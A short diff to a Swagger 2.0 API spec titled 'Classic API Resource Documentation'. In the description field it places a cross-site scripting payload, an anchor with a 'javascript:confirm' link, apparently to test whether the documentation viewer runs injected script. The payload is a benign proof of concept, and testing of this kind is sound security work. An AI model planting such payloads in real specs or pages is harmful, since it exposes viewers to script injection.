@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <<h1>XSSS</h1>
+    <a href="javascript:confirm``">XSS</a>
 
   version: production
 basePath: /JSSResource/
